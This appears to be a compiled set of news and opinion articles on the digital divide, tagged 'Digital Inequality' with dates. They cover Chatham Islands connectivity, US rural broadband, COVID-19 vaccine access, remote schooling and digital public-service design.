On the well-connected mainland, by contrast, once the signal from your device reaches the cellphone tower or wifi router, the signal moves through the internet’s physical infrastructure: cables running on land and under the ocean, making binary pulses of electricity appear in a dynamic arrangement of pixels on a screen.

T he invisibility of this infrastructure means that when it works well, nobody has to think about the internet at all. In urban Aotearoa, internet speed is rarely a factor when deciding whether to set up a Zoom call or watch YouTube. For many, anxiety about the internet centres around its omnipresence. Should children have less screentime? Will Elon Musk’s Twitter takeover result in unbridled hate speech? Is social media destroying social bonds?

But the internet looks different outside of our major cities: what counts as “reliable, high-speed internet” in the Chatham Islands, even post-upgrade, would be unfathomably slow and unpredictable to a central Aucklander with a fibre connection. Here, the questions are different: the problems rural residents face are less about having too much internet, and more about having too little.

To Chatham Islanders, for example, the details of Elon Musk’s possible Twitter takeover are immaterial. But Musk’s Starlink service, which uses low-orbit satellites to provide fast internet, is definitely of interest. When I ask islanders about Starlink, rumours echo: some denied any knowledge of the service, while others told me that the Chathams had been left out of an early Starlink trial, but the service could be available soon. (Starlink did not respond to The Spinoff’s request for comment).

In New Zealand, regardless of where you live, the internet is embedded in everyday life, now the default for filing taxes, accessing educational resources and using Manage My Health. These services are predicated on the expectation that everyone has ready access to the internet, and while this is true for the majority of New Zealanders, it is not true for everyone. For some, such as communities in South Auckland – disproportionately Māori and Pacific people – the digital divide is caused by an inability to access internet connections, with the cost of broadband or devices being prohibitive for many. A lack of digital literacy is also a barrier to access. Digital inequality is a global issue: many places around the world simply don’t have the electrical and telecommunications infrastructure that enable the internet. Compared to the nearly three billion people estimated to have no connectivity whatsoever, worrying about a crypto crash or Elon Musk seems trivial.

But for the most part, those who put services online have easy access to the internet, so they assume everyone else does too. This creates a tension for those who depend on older systems of phone lines and paper forms in a world where digital access is prioritised.

This contrast is clear at the island’s hospital, a long wooden building bracketed by trees and parked utes. I talk to hospital manager, nurse, and seventh generation islander Sally Lanauze, a tall woman with steely grey hair, who tells me what they use the internet for: sending x-rays, consultations with specialists, coordinating prescriptions and Covid response with the rest of the Canterbury DHB. She gestures at the hulking grey fax machine, which works through copper landline phone lines. While the fax machine is an essential back-up if digital systems don’t work, it’s now rare to find places on the mainland you can send faxes to.

Reckoning with the island’s uniquely unpredictable geographies – on the day we speak, Lanazue has had to cancel blood tests scheduled for the afternoon, as the flight that takes the samples to a Christchurch lab has been cancelled due to fog – requires resilient information systems. The new internet at the hospital isn’t as fast as they’d hoped, but as a DHB employee, Lanauze is reluctant to complain about it.

Eventually, the Chathams will need an upgrade to their internet system. For many islanders, the ultimate fast connection can only come from an undersea cable snaking solidly along the ocean floor. But cables are staggeringly expensive – each kilometre costs tens of thousands of dollars – and the cables themselves are vulnerable to damage from rodents and volcanoes in a way that satellite systems are not.

For now, Chatham Islanders have to work with what they’ve got, which is a satellite network that covers 65% of the islands and could be interrupted by bad weather – not full coverage, but vastly better than before. That means getting creative. “You have to be prepared,” says Jenny, a beautician who also works as a receptionist at Hotel Chatham. She moved to the island recently, and it’s important to her to be able to stay in touch with friends in Wellington. She opens her handbag and pulls out a white router, balancing it on her fingers. “I carry my modem everywhere and people laugh at me,” she says; nonetheless, wifi is much more reliable than mobile data, which makes teasing worth it.

“G od bless The Warehouse, they deserve a medal,” says Keri Day, who runs Waitangi Cafe on Chatham Island. It’s early afternoon, overcast grey light filtering onto the lino floor, and the cafe has just closed. Day, wearing a flowy floral shirt, is scrubbing the countertops with Barman’s Friend. Behind her, her mother – who is also a JP – is sweeping, while her 14 year old son, Wiremu, puts things away, three generations moving in an easy choreography.

For islanders like Day, the distance that makes communication from the Chathams difficult has another, more pressing effect: everything is expensive. The Chatham supply ship arrived a few days ago, and Wiremu has just picked up their mail, which includes an order from The Warehouse. Online shopping at low-cost providers like the big box store is critical for making life on the island more affordable, Day says. She gestures to the board behind her, offering fish, chips, ice cream and coffee. Prices – $15 for a burger – have just been revised in tell-tale fresh tape. “We hate doing it,” Day says, “but the cost of electricity has just gone up. We can only afford to open four days a week.”

While the main store at Waitangi, as well as a dairy called Dough n Go, offer basic groceries, online shopping is the default on the island for non-perishable goods. The cost of shipping means that prices in the island’s stores are tremendously elevated; when I visit, a single serve packet of instant noodles costs $4, and diesel (the main fuel on the island) is more than $3 per litre. Perishable goods are even more expensive: Sally Lanauze, the general manager at the hospital, grows all her own veges out of necessity. “Did you see how much milk costs?” Lanauze asks me. I haven’t. “They don’t write it in,” she says, “but it’s $12.”

It’s not just food, either. “I’ve been told we have the most expensive electricity in the world,” says Gail Amaru; the week I visit, electricity costs $1.14 per kWh unit, nearly four times as expensive as in mainland New Zealand. “We want to embrace technology, but we want there to be a sliding scale – for vulnerable kaumatua [receiving superannuation], where’s the balance?” On icy mornings, Amaru has walked into homes where people huddle with all their layers, refusing to run the heatpump. With high food costs, many islanders rely on pāua and homekill for nourishment, but a bad season or tourists taking from the pāua beds – not to mention climate change – can also make those food sources out of reach too.

While the internet cannot solve the structural issues that elevate prices in the Chathams, online delivery from the Warehouse and major supermarkets can help make cheaper goods available. Islanders can order their groceries to be delivered to the port in Timaru or Napier, where the supply ship leaves from, paying a freight charge for each banana box stuffed with cereal and canned vegetables. Online shopping has some challenges – shopping software Shopify, for instance, doesn’t recognise Chatham addresses – but most residents are grateful that it makes getting goods from the mainland easier and cheaper.

The internet upgrade has also made the cost of broadband in line with prices in the rest of New Zealand, removing one financial burden from islanders. Before the internet upgrade, Hannah Noble, who runs the Keto New Zealand Facebook group, had to pay $160 a month for internet whether she used wireless satellite providers Farmside or Wireless Nation – the only two choices. She didn’t have a choice about paying: she couldn’t work without a connection. The internet upgrade means that she now pays less for better service; on top of that, access to the cell phone network means she can go camping with friends by the lagoon without worrying that she’ll miss posts on the page, or fall behind in moderating comments.

F or some, having cell service is a source of daily relief. Katrina Graydon works at the museum in Waitangi, a room that is home to cut-outs of a New Zealand Geographic article about dinosaur fossils the island; the skin of a fur seal, once a major industry here; and a cabinet with relics from Te Kooti’s exile on the island.

It’s an hour’s drive over empty gravel roads to her home in Kaingaroa, a tiny fishing village in the far north of the island. Before cell service was available, Graydon would message her husband Philip as she was leaving work. “He had to know when to expect me, so that if I broke down, got a flat tire, he’d come looking for me.” Vehicle breakdowns are a common concern on the isolated island. With cellphone service – the network covers 119 kilometres of island roads – she no longer has to worry; if anything goes wrong, help is just a text message or call away. Connection on the Chathams makes life there safer.

The cellphone network can also facilitate other important functions, says the Rural Connectivity Group. Metz tells me that Civil Defence has now been able to trial sending alerts to Chathams residents’ phones, a service that could be vital in the only part of New Zealand that has had a deadly tsunami. People working on fishing boats – a key industry on the island – can more easily report their catches, as required by MPI. “If you’d like to be out of contact, I’m a big believer in this thing called the off button,” says John Proctor, when I ask him about the downsides of the internet. “But when there’s an emergency, or something comes up, it’s good that there’s the ability to be in touch.”

T he Chatham Islands may be 800 kilometres away from any other landmass, but islanders are still deeply reliant on the digital worlds forged on other shores. Locals love it here, love the deep twinkling darkness of a sky without light pollution and clear silence solidified in the often-present mist. But finding a sustainable future for this remote place means changes on the islands, and the internet will be crucial.

“I’m always hopeful that we can grow our economy,” says Monique Croon, mayor of the islands. As the proprietor of the island’s only hardware store, she’s familiar with the trials of the distance from the mainland – she calls it “800 kilometres of difficulty” – herself: remembering to order products that might not come for months, having to raise prices, again and again, just to make her business viable.

What eases that difficulty? Zoom calls uninterrupted by freezing pictures and distorted audio. Internet fast enough to send big PDFs without messages getting stuck in an outbox, the ability to make phone calls wherever you are. When Croon meditates on the islands’ future, the internet is there, facilitating business and making it easier for people who move from the mainland. Infrastructure on the island is improving: if they can make more housing available, if renewable generation decreases the cost of electricity, if the new airport runway brings more tourists, and if the internet is there for it all, many possibilities beckon.

Many islanders hope that better internet can make it easier for young people to live on the island.

Parents and kids I talked to across the island are enthusiastic about the potential of the internet to entertain the younger generation. Digital education is promising too, with young islanders taking advantage of the plethora of resources that teach children to code and let high school students study remotely during lockdowns. School principal Philip Graydon – father to Gretha and husband to Katrina – is particularly optimistic about the role of the internet for children on the island. I talk to him at a farm and nature reserve where he’s taken the five children of Kaingaroa School for a field trip. “I’m a Google certified educator – it just seemed important,” he says, flipping through his iPhone to show me the digital interface of the weather station installed by the school.

All the kids – who are currently running around, pestering the farmer to tell them the story of how a farm bike got stuck in a bog – have Chromebooks, and when questions he can’t answer come up in class, he asks Siri, or teaches his students to research their interests by themselves. Graydon thinks that it’s essential that children on the island are equipped for a digital age and the realities of life on the mainland.

His words seem a little at odds with our surroundings, our shoes muddy from traversing puddles (the kids have given me a very hard time for not having gumboots), a patch of restored bush behind us where the children have just met baby taiko and ranguru chicks, encountering them with equal fear (they’re bitey) and fascination.

But to Graydon, the internet can make the inevitable transition to high school on the mainland easier, as well as helping kids to know more about the place they already live. “Parents want kids to know what the mainland is like,” he says. At the same time, the specialised resources of the internet, like monitoring island weather or contacting scientists who are experts in island ecology or geology will give kids a relationship to the place they live. The internet, as well as the island community, can facilitate the confidence and consideration towards the Chathams that could determine whether these children want to live here long-term.

It’s tempting to romanticise the Chathams, these nearly empty islands nestled close to the International Date Line, a manifestation of a past where communication was much slower. But despite their remoteness, global issues of natural disasters, digital equality, economic insecurity and so much more reach the shores of the Chathams. And so does the internet. “We’re here at the edge,” says Philip Graydon, watching the children he teaches, watching light shift against the sea. It’s 2022, and edges can be connected.",Digital Inequality,2022-06-09 17:26:27

In today’s economy, making high-speed internet more available will give more Americans new opportunities.”","From the comfort of their homes to the nearest coffee shop, Americans expect—and rely—on internet access being available almost wherever they go.

But the Federal Communications Commission estimates that more than 21 million people in the United States don’t have that connection. That includes nearly 3 in 10 people—27 percent—who live in such rural places as the outreaches of Maine and the fertile fields of Indiana, as well as 2 percent of those living in cities.

Research shows that 40 percent of schools lack broadband, as do 60 percent of health care facilities outside metropolitan areas.

And those estimates are on the low side. Other research, including analysis from Microsoft, suggests that the number of Americans without broadband—that’s internet access with download speeds of at least 25 megabytes per second (Mbps) and upload speeds of at least 3 Mbps—could be over 163 million.

And at a time when broadband access has become increasingly essential, any community without fast, reliable internet is condemned “to a long, dark death,” says Peggy Schaffer, executive director of Maine’s ConnectME Authority, which is working to extend service in the state.

Think about it, Schaffer says. Without broadband, “Kids can’t do homework. Older people have to drive off our islands to talk to a doctor. Boats delivering live lobsters from the ocean that can’t ‘talk’ in real time to their customers lose a competitive edge in the supply chain. Before long, young families, older citizens, and jobs leave. New employers don’t come in.”

Cost is one obstacle to extending broadband internet to everyone who wants it. The companies providing the services need adequate returns to justify their investment in the necessary fiber, towers, and cables. And at the other end of the supply-demand equation, many low-income Americans lack access because they cannot afford the monthly bills that come with connecting a computer to high-speed internet.

The Pew Research Center reported in May that 44 percent of adults in households with incomes below $30,000 don’t have broadband. This disparity in access is also seen in what researchers call the “homework gap”—the differences between school-age children who have access to high-speed internet at home and those who don’t. A 2015 center report found that 35 percent of lower-income households with children in school didn’t have a broadband connection at home.

“Without broadband, kids are left behind,” says Schaffer.

Even with the wide discrepancy in estimates on the extent of the digital divide, state leaders are seeing the need for more access in many communities and working to make connections.

“States have employed a range of policies and practices to achieve the ‘last mile’ of high-speed connection—the link to homes, schools, businesses, and others who still need access,” says Kathryn de Wit, who manages Pew’s broadband research initiative. “It has spurred creativity at the state and local level, as well as in the private sector, in Maine and across the country.”

Policymakers in rural and urban states alike are creating new approaches, including building partnerships between public and private entities and using grants from foundations to bring broadband to more sparsely populated places.

Small providers “pop up in places large internet companies don’t serve,” says Shirley Bloomfield, CEO of NTCA-The Rural Broadband Association, a membership organization of nearly 850 small providers in 45 states. “Hometown phone companies expanding into this market offer broadband to as few as a hundred neighbors.”

The experience in Maine shows that it takes a lot of effort—and persistence—to close the last mile

of connection.

“Building momentum toward a community-based broadband solution is like building a political campaign,” says Mark Ouellette, president of Axiom, a small internet provider with 10 employees in Machias, Maine, not far from the Canadian border. “Three rules help us gauge progress. First: You need local champions to rally support. With their help we can discuss the community’s goals, do surveys, and hold meetings that explain options. My second rule mirrors a Lady Gaga song: There are a hundred million reasons to walk away; you need one good reason to stay. There’s always some resistance. It can be overcome with a good set of goals aimed at revitalizing the community. The third rule: Resist talking about cost till your champions and goals are in place.”

He says that approach helped get high-speed internet to Cranberry Isles, off Maine’s coast near Bar Harbor.

“Broadband now enables better fire and police service, induced more families to remain on the islands, and increased tourism there. Tourists stay longer when they can work online and use email,” Ouellette says. “High-speed internet in Cranberry Isles costs subscribers $69 a month for an upload speed of 25 Mbps and helps the community maintain its way of life. One seasonal resident told me it’s faster, cheaper service than he has in Brooklyn.”

In Indiana, large-scale farmers have paid to bring broadband to their farms—often with help from seed manufacturers and data management companies that, like the farmers, rely on high-speed internet for modern, precision agriculture.

“Farmers can get a cellphone warning late at night that a fence was breached and from bed know exactly where, and how many cattle to round up. Internet data also tells the temperature inside livestock barns, and how much water and feed is being consumed in each, such that the farmer can diagnose illness before symptoms show and disease spreads,” says Justin Schneider, who directs state government relations for the Indiana Farm Bureau. And he notes, “These efficiencies ultimately benefit the consumer by lowering costs.”

But Indiana has plenty of small and midsize farming operations that can’t afford to pay for bringing in high-speed internet themselves. They could be getting help soon from $100 million that state leaders set aside this year to help jump-start installation of fiber-optic cable in rural Indiana.

A Purdue University agriculture economist analyzed the costs and benefits of broadband installation within the service territories of seven electric cooperatives and extrapolated the findings to the entire state. The economist’s report, which helped spur the new funding, said:

“Every dollar invested in broadband returns nearly 4 dollars to the economy. It’s unusual to see returns that significant. The finding of a 4:1 return validates the opportunity that could be created by full broadband deployment in Indiana, where 93,000 people within just the seven electric cooperative areas are without it.”

Other states are trying to be equally inventive.

In 2010, North Carolina’s Golden LEAF Foundation, created by the state Legislature and funded from the national settlement with cigarette makers, distributed $24 million that, along with federal funds and assistance from a nonprofit internet provider, paid for 2,600 miles of fiber cable to link 83 of the state’s 100 counties. Access points connect public schools, state universities, community colleges, and some public libraries. That, says Jeffrey Sural, director of North Carolina’s Broadband Infrastructure Office, gives “all state students equal footing as far as internet is concerned.”

North Carolina also employs teams of technical advisers in specific regions to work with local leaders and help them get service. The teams have sample ordinances that towns can use for legal issues, such as hanging wireless equipment on municipal water towers and other tools for local officials to seek and evaluate bids from internet providers. But expansion often comes down to how much will providing service cost and who will pay for it. And, as Sural notes, “Cable is labor intensive and not cheap.”

Even as states try to expand access, their efforts underline one key tool in solving the connectivity gap.

“What policymakers need is a comprehensive overview of what’s been tried and what’s been successful, so they can continue to learn from one another,” says de Wit.

Pew’s broadband research initiative is aiming to do just that. The initiative—launched in 2018—is working to identify promising state practices that address gaps in connectivity. Early indications from the research suggest that most states have begun to address broadband access: Some are creating a state task force, others are collecting data about connectivity, and still others are allocating funding for expansion efforts. But the research also shows that these efforts vary from state to state, with communities tailoring approaches to fit their unique needs.

The enthusiasm for these expansion efforts, says Pew’s de Wit, shows that policymakers understand the promise of high-speed, reliable internet access.

“We all have a stake in building communities that will thrive in the future. In today’s economy, making high-speed internet more available will give more Americans new opportunities.”",Digital Inequality,2022-02-08 08:00:00

This blog is from a series on digital safeguards and enablers for COVID-19 vaccine delivery.

Digital technologies, including mobile technologies, are facilitating every stage of the vaccine supply chain, from planning, through delivery and post vaccination monitoring. A recent study found that a robust data infrastructure helps local authorities identify priority groups, send invitations, and arrange transport for those who may need assistance. The advantages of digital solutions are even more clear in the last mile vaccine delivery: they enable people to access information about the national and local vaccine campaigns, check eligibility, register for vaccination, and schedule follow-up appointments whilst minimizing human interaction throughout the process. Indeed, online systems, e-mail, and mobile applications are the predominant way that countries are distributing vaccines to their citizens.

In countries where the vaccine campaigns have already begun, we are seeing that the digital divide, if unaddressed, has a risk of widening the vaccine divide, potentially leading to negative health outcomes. The availability and access to high-speed internet and devices such as computers and smartphones as well as one’s ability to navigate the web play a crucial role in accelerating COVID-19 vaccine delivery in some countries.

The digital divide is universal and multifaceted

The relationship between the digital divide and unequal vaccine distribution is exacerbated in developing countries where digital disparities are wider and more varied. According to the International Telecommunications Union (ITU), only 28% of the rural households in developing countries had access to the internet in 2019 (65% in urban areas) compared with 81% in developed countries (87% in urban areas).

The gender gap in access to the internet remains large as well: In developing countries 40% of women and 49% of men used the internet in 2019, compared to 86% and 88% in developed countries. In LDCs, this gap is even wider: only 15% of women and 28% of men used the internet in 2019.

Digital connectivity is key to ensuring that nobody is left behind in COVID-19 vaccine delivery efforts. As the immediate first step, countries embarking on the vaccine rollout should assess the connectivity needs in health clinics, schools and other community facilities that will house, manage, and distribute vaccines to the local population. Governments, in partnership with private sector operators, should consider a range of policy options to expands broadband access and capacity like a temporary release of frequency spectrum and a review of the rules governing the use of Universal Service Fund (USF) to address connectivity gaps particularly in rural communities.

Closing the gap

Implement rapid connectivity solutions for key facilities and community centers

In the areas where physical infrastructure and terrestrial networks are not readily available, government and local authorities can consider innovative measures to provide broadband connectivity. For example, Avanti Communications Group, in partnership with the Kenyan Education Ministry and the UK Department for International Development (DFID), is providing satellite broadband connectivity to 245 rural and remote schools for more than 180,000 children, thereby enabling e-learning through iMlango Initiative. Similarly, in the wake of the COVID-19 outbreak, the World Bank has provided free Wi-Fi connectivity to 30 critical public institutions, including hospitals and schools by purchasing bandwidth capacity and equipment for Wi-Fi hotspots through the ongoing Digital Malawi project. By adopting such connectivity solutions, among other technology solutions that can generate rapid impact, health clinics and facilities can be a central hub for vaccine delivery and serve as community networks in the future.

Provide measures to temporarily subsidize/address affordability of data and devices

In addition, it is also necessary to address the internet usage gap by connecting those who are currently offline to internet-capable devices, such as phones, tablets, and computers, and making the cost of the internet more affordable. Increased availability of digital connectivity can only enable people to obtain information about vaccination and schedule appointments when people can actually use the internet. Governments and local authorities, in partnership with mobile network operators, can consider providing subsidies or offering loans for purchasing devices. By way of an example, the U.S. Federal Communications Commission (FCC) recently introduced Emergency Broadband Benefit Program to provide a monthly subsidy for broadband services as well as a discount on purchasing a device. As another example, at the outset of the COVID-19 outbreak, many operators and governments around the world, including Ghana, Djibouti, and South Africa, zero-rated — or making free of charge for certain services and conditions — access to educational platforms and websites to ensure the continuity of learning. The zero-rating service could be applicable to the COVID-19 vaccine delivery as well with free access to relevant websites.

Beyond the emergency response for equitable COVID-19 vaccine delivery, countries can leverage this opportunity to strengthen the key underlying pillars of digital economy, including digital infrastructure and digital skills, forging resilience to future shocks. A strong foundation of the broadband ecosystem and digital infrastructure brings transformative benefits across various sectors and applications, such as telehealth, online learning, digital government systems and e-commerce. In the meantime, it is also necessary to make progress toward digital equality within a country between different age groups, genders, and urban-rural communities, among others. To this end, investment in digital skills and literacy is an essential part of efforts to expand broadband access and usage.

As school districts throughout the country gear up for another round of online learning, parents, educators, and policymakers are forced once again to contend with the widening “digital divide” – the lack of consistent or reliable access to online-learning devices and the internet for all students.

In New Jersey, the state Department of Education estimates that 230,000 pre-K to grade 12 students lack sufficient online learning tools, prompting Gov. Phil Murphy to unveil a plan in July to bridge this gap.

This dire issue, explains one Rutgers University–Camden researcher, is a much deeper societal problem than having a dependable computer and internet connection – and must be addressed accordingly.

“When we hear the term ‘digital divide,’ we might think of a divide in access to technology between ‘haves’ and ‘have-nots,’” says Jim Brown, an associate professor of English and director of the Digital Studies Center at Rutgers–Camden. “For a long time, we have tried to address this issue by getting computers into classrooms, but this isn’t the best way to think about this problem; access to tools looks very different for different individuals.”

Brown notes that some students who do have access might have slower or less reliable internet connections, and/or might have older computers in need of an upgrade or repair. Moreover, having access to the tool doesn’t mean the same level of access to a support network for learning how to use that tool.

“Does someone’s family or friend group have the time and resources to help that person learn how to use the tool?” he asks. “The divide here is really less about digital technology and more about the larger, systemic divides in our society. The income and wealth gaps are the real divide we need to address if we want to think about the digital divide.”

The pandemic, he says, has shed light on the insidious fact that digital access is not evenly distributed and that publicly available systems – for instance, Wi-Fi at libraries and universities – are resources that many people rely on.

“When students move to remote learning, those systems become difficult or impossible to access, meaning that many students either have to find workarounds or simply have no way of doing their work,” he says.

Even more alarming, he says, many parents whose children lack sufficient online-learning tools are now faced with the choice of whether to send their kids to in-person classes despite the inherent risks.

“It is yet one more situation where the systemic inequalities are forcing those with fewer resources into more dangerous situations,” says Brown, who adds that teachers, whom we rely on to “make do,” are also forced into more precarious working conditions.

The Rutgers University–Camden researcher acknowledges that school districts are in an impossible predicament, given small or shrinking budgets. He posits that the problem of the digital divide is one to be taken up not just at the school-district level, but at the municipal, state, and federal levels.

“There are just not enough resources available to schools to actually address this problem,” he says. “In the meantime, districts will have to make no assumptions about what their students do or don’t have access to. They will then have to work from the idea that everyone’s access is bare-bones and build their curriculum from there.”

Brown further notes how the entire educational infrastructure is built on the idea that students can visit a physical space to learn and gain access to resources. However, many schools can’t even typically rely on that, given that school funding is tied to property taxes.

“The best thing that parents can do is advocate for their kids while schools plan for remote learning, reminding districts of issues that they may not be thinking of,” he says.

One glaring problem, he continues, is that certain places and regions around the country do not have stable internet access. Consequently, he argues, internet access should be treated as a public utility, funded in the same way and regulated as such.

“This means figuring out a way to make sure that everyone, no matter where they live, has high-speed internet access,” says the Rutgers–Camden scholar. “This is no longer a ‘luxury’ good; it’s the same as having access to power and water.”

But don’t quit there, says Brown. Policymakers need to rethink public education from the ground up, he says. That means not tying school funding to property taxes, but also undoing the decades-long defunding of public education – in K-12, as well as at higher-education institutions – that has exacerbated inequalities, digital and otherwise.

“If we want to address the inequalities that define our digital lives,” says Brown, “we have to address the deeper, systemic problems that continue to widen the gap between those who can assume systems will be available, accessible, and working for them, and those who cannot.”",Digital Inequality,2020-08-25 15:19:29

In 1995, the U.S. National Telecommunications Infrastructure Administration was the first government body to empirically document the existence of the “digital divide”—the gap between those who do and do not have ready access to internet service. In a report that year—”Falling Through the Net“—the agency described the geographic, demographic, and economic divides in the adoption and use of the internet. The report was prescient in recognizing the role that disparate infrastructure and hardware access played in driving digital inequality and showed how those inequalities impacted how people were using the internet.

The NTIA report also made a crucial wrong bet. It assumed that there was “an” internet and that fixed-line broadband to a personal computer would be the common denominator technology to enable access. But the world didn’t primarily adopt fixed-line broadband. Instead, mobile phones and the mobile internet became the primary mode of access. While the NTIA was right that the primary drivers of digital adoption were content and services, the presumption of a computer-based internet shaped a generation of service providers to design for digital platforms that fail to reach nearly half the world, making those services inaccessible to those who need them most.

While the digital divide is now a globally understood phenomenon, more than 25 years after the NTIA report, service designers are still designing and building public technology systems that depend on the internet, preferencing the well-connected and embedding the digital divide. The tendency to design services for the internet—in both technology adoption and in the services that depend on them—is the digital services design divide.

COVID-19 and its accompanying lockdowns have only made the digital services design divide more stark. Public institutions turned to digital tools for both internal operations and to interact with those they serve, relying on technology companies to preserve vital public functions, from online court proceedings to digital payments for taxes and fees. That turn has embedded the digital divide in these systems. The most stark example of this divide has been in the public education system’s adoption of digital tools (many of whom explicitly prioritized continuity over equity in education interventions). Even before the pandemic, the “homework gap” was described as “the cruelest part of the digital divide,” with 50% of students reporting that they were unable to complete homework because it required access to the internet. Early research suggests that student well-being and performance has suffered during the pandemic, and that those effects are also being felt inequitably—by the same groups the NTIA highlighted in 1995.

As it turned out, mobile phones became the world’s common denominator technology and messaging, far more than the internet, its killer application. Some 26 years after the NTIA report, 3.7 billion people—half the world’s population—still lack any form of internet access, and getting that “remaining half of the world online will be a whole different ball game,” as Doreen Bogdan Martin, who leads the International Telecommunication Union’s development bureau, observed at the recent Global Digital Development Forum. Even as internet access lags, mobile phone penetration is speeding ahead. There are 5.27 billion unique mobile phone users in the world, making up two-thirds of the world’s population. And there are more mobile phone connections than people in the world. Nonetheless, 3.4 billion people live in an area with mobile broadband coverage, which is how most people access the internet, but don’t use the internet. That makes the usage gap—the number of people who live in an area with mobile broadband but don’t use it—six times larger than the coverage gap, which refers to the number of people who don’t have access to mobile broadband at all.

Despite the evidence, history, and scholarship demonstrating that digital infrastructure isn’t the primary problem, public service designers are failing to meet users on the platforms available to them. Rather than acknowledge it and require designers to build services for the widely available tools, institutions mostly focus on hardware, infrastructure, and patchwork fixes, like distributing devices and public hotspots. That’s how, service by service, the people un- or underserved by technology are categorically and cumulatively marginalized by public services. The more public services focus on digitization as the next step in their evolution without proactively addressing the digital service design divide, the more digitization disconnects the least connected.

The design and roll-out of national vaccination campaigns has demonstrated the stakes of failing to deliver accessible services. Like access to connectivity, vaccine distribution has favored the wealthy and powerful and, and the use of technology in enabling vaccine access has amplified that dynamic, especially in India. In January, the Indian government began its vaccine roll-out by making doses available exclusively through a web-based system, CoWIN. Conditioning vaccine access on registering through a web portal failed to address the needs of India’s significant population without internet access or digital literacy. While the number of mobile connections in India equals 79% of the population, internet connectivity is somewhere between 20.1% (ITU) and 56% (Indian government), depending on whom you ask. Exacerbated by supply problems, India’s vaccine distribution has failed to achieve widespread inoculation. As of the end of June, a mere 4% of the country’s population was fully vaccinated.



While it’s easy to opine about the imperfections of digital infrastructure and adoption, digital design comes down to a series of choices—for example, how to manage who gets vaccines and how vaccines are rolled out. And while India’s case is illustrative, the same dynamic has been present in digital COVID-19 responses globally, no matter the jurisdiction or the connectivity. India’s decision to make online registration a requirement for vaccines is a choice, one that embeds the inequalities of the digital divide in the way that Indians access vaccines. These decisions are made so often across millions of services, that they feel inevitable—and their cumulative effect, like climate change—is to individualize the responsibility for the divides that public institutions enable through their service design choices.

The digital service design divide has at least two political effects: (1) It puts much of the blame for systemic failure on those unable to access digital systems and (2) mollifies the people with the knowledge and resources to access the system. The responsibility for equitable delivery of public services rests with the government, but digital public service design typically starts with an assumption of internet connectivity and digital literacy. By making public service delivery more convenient for those with the ability to use online services comfortably, usually the urban elite, the digital service design divide becomes invisible for many of the people with political influence to compel better practice. As the saying goes, “the greatest trick the devil ever pulled is to convince the world he doesn’t exist,” and the digital service design divide, whether hiding behind innovation or ignorance, has become a vehicle to perpetuate problematic politics and systemic racism.

The phrase “digital divide” is a valuable piece of nomenclature, but like the NTIA report that solidified its existence, the phrase makes a critical framing error. Internet access on its own is not enough if services remain inaccessible. The role of public governance and service design is to build services that acknowledge disparities and create a balance that prevents them from becoming a driver of inequality and conflict. The digital services design divide is both immediately addressable, and the kind of small, cumulative harm that can feel impossible to bridge. The first step is to prioritize equity in service design. Otherwise, the more we use digital services to build social safety nets without designing for the holes, the more of us—as the NTIA pointed out some 25 years ago—will keep falling through.",Digital Inequality,2021-07-01 07:00:00

The most basic is the divide between the digital haves and have-nots, a reflection of economic inequality. Distributing smartphones and laptops to children in this context is like treating the symptom rather than the disease. The lasting solution would be in taking all-encompassing policy decisions. Paradoxically, those who need a change cannot bring it about and those who can do not want it. Going behind the façade of the digital divide enables us to unravel the real dynamics.

Globally, the neoliberal era has seen paradigm shifts in education. The shift towards a materialist philosophy in education has been caused by four structural developments: One, the entrepreneurship-led economic growth powered by innovation and technology; two, increasing knowledge intensity of production; three, a borderless world facilitating knowledge flows; four, knowledge explosion, coeval with knowledge implosion. The networked world of flexi-specialisation and changing skill matrix prioritises learning (lifelong) over study (terminal). Knowledge obsolescence involves “creative destruction”, not only of goods and machines, but also of ideas, knowledge, values and attitudes. As the shift from resource-/labour-intensity to knowledge-intensity occurs, knowledge becomes a commodity, leading to commercialisation of education, predicated on creativity and innovation.

While the Industrial Revolution was the first systematic attempt at coordinated/syncretic application in the production of knowledge, today knowledge production, collation, transaction and application are themselves independent economic activities, employing burgeoning armies of scientists, scholars, supporting personnel and using a vast array of labs, libraries and computer networks. The knowledge economy is booming.

The Indian education sector has been undergoing an unprecedented transformation. There has been a rapid increase in student enrolment and diversity; quality and relevance considerations are dominant. Parents and students consider education an assured instrument of mobility. This was, till recently, a middle-class feature, but is now seen across the class spectrum, leading to demands for an inclusive system. Knowledge is a commodity with a thriving market. Commodification leads to commercialisation, attracting private investment. This must be welcomed.

The question of who provides education and with what motives is less important than value re-orientation and attitudinal change. Modern values — quality, competence, competitiveness, optimism, confidence, innovation — must replace older ones — discipline, obedience, hard work, respect, compliance, allegiance. A system of education extolling hard work is anti-human, unproductive and regressive. The importance of creative/productive work done in non-exploitative, self-actualising, self-fulfilling atmospheres must be flagged. Raising questions and seeking answers should form the bedrock of education.

The digital inequality in Indian education is a cause for concern. There is a digital divide which is not educational, but a socio-economic one. The material poor are also the digital poor. The digital revolution, with its emphasis on robotics, artificial intelligence, and cloud computing, will bypass the “capability poor”. The solution hinges on guaranteeing economic security with assured basic income through provision of universal property rights. Article 21A now guarantees the right to education for children in the six-14 age group. This progressive step should be extended to all sectors and levels of education.

Modern education is costly. The exponential growth of demand cannot be curtailed as it is linked to rising democratic and human rights consciousness. The solution lies in exploring the scope for financing on a larger canvas, tapping into the hitherto unexplored avenues, the bottomline being that no student drops out due to an inability to pay. The steps towards this solution could include: One, enhancing budget allocation by reordering fiscal priorities, and applying methods like zero-based/ outcome budgeting etc. Two, put education at the centre of economic/ development policy formulation. Involve the corporate sector in meeting the demand for publicly funded education, not just through CSR, but as part of academic social responsibility, in return for special concessions and incentives. Three, require parents to pay for education by ramping up their economic base through the measures mentioned above. Parents in the new scenario won’t grudge payment. Four, institute endowments and enhance diaspora contributions. Education today is not a question of charity, but a matter of right.

To avoid this tragedy, we must act immediately and decisively to close the digital divide.”","While K–12 students’ access to computers and the internet improved during the pandemic-plagued and largely remote fall school term, a clear digital divide persists, especially among Black, Hispanic and low-income students, according to a new report (PDF) by the UCLA Center for Neighborhood Knowledge.

“It appears that the lack of access has become less severe this fall than it was last spring, as schools have made adjustments to support remote learning,” said Paul Ong, the center’s director and an author of the report. “But it is also clear that a lack of access and a real and troubling divide remains.”

This digital divide, the authors say, translates into students missing lessons, being unable to access materials and struggling to complete assignments — all of which have significant implications for long-term learning and success later in life.

The researchers used data from the U.S. Census Bureau’s Household Pulse Survey to provide a current look at access to computers and the internet among households with school-age children across the country. Their findings show that the rate of limited digital access for households fell from a high of 42% during the panic and chaos of school closures last spring to about 31% this fall.

